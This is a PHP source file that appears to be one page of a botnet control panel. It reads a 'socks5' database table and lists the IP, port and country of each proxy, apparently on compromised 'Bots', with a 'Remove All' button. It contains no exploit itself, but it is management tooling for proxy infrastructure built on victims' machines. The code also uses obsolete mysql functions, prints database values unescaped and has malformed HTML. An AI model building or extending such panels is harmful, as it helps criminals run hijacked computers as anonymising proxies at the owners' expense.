<!DOCTYPE html>
<html lang="en">

<head>
  <link rel="stylesheet" href="css/screen.css" type="text/css" media="screen">
  <link rel="stylesheet" href="css/buttons.css" type="text/css" media="screen">
</head><?php
include("config.php");
include ("auth.php");

if (! $connect) die(mysql_error());
mysql_select_db($dbname , $connect) or die("Couldn't open $db: ".mysql_error());
$result = mysql_query( "SELECT * FROM  `socks5`" )
          or die("SELECT Error: ".mysql_error());
$num_rows = mysql_num_rows($result);
print "<center>There are $num_rows <b>Socks5's</b> found.<br>";

//print "[][][][][][][][][][][][][][][][][][][][][][][][][][][][]<h1>Bots</h1>";
while ($get_info = mysql_fetch_row($result)){
echo "<table border='1'>
<tr>
<th>IP</th>
<th>PORT</th>
<th>Contry</th>
</tr>";
echo "<tr>";
foreach ($get_info as $field)
print "<td> $field </td>";
echo "</tr>";

}
echo "</table>";
mysql_close($connect);
?>
<html><form><a href="socksrall.php"><button class="download-itunes">Remove All</button></a></form>
<form><a href="a.php"><button class="download-itunes">Back</button></a></form>
<html>



</html>